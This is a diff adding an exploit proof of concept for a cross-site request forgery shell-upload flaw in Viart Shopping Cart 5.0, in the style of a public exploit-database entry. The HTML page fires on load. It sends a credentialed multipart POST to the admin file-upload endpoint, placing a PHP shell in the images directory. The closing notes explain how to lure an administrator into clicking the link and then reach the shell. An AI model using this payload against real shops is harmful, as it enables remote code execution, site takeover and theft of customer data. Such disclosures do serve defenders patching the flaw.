@@ -1,0 +1,57 @@
+<!--
+# Exploit Title : Viart Shopping Cart 5.0 CSRF Shell Upload Vulnerability
+# Date : 2016/06/12
+# Google Dork : Script-Kiddie ;)
+# Exploit Author : Ali Ghanbari
+# Vendor Homepage : http://www.viart.com/
+# Software Link  : http://www.viart.com/php_shopping_cart_free_evaluation_download.html
+# Version : 5.0
+
+
+#POC
+-->
+
+<html>
+  <body onload="submitRequest();">
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/admin/admin_fm_upload_files.php", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
+        xhr.withCredentials = "true";
+        var body = "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"dir_root\"\r\n" +
+          "\r\n" +
+          "../images\r\n" +
+          "-----------------------------256672629917035\r\n" +
+          "Content-Disposition: form-data; name=\"newfile_0\"; filename=\"[shell.php]\"\r\n" +
+          "Content-Type: application/x-php\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------256672629917035--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+  </body>
+</html>
+
+<!--
+#Desc:
+
+upload exploit code in your host and send link to admin when admin click on link, you can
+access to your shell from below path :
+
+http://localhost/images/[your shell]
+
+####################################
+ 
+[+]Exploit by: Ali Ghanbari
+
+[+]My Telegram :@Exploiter007  
+-->
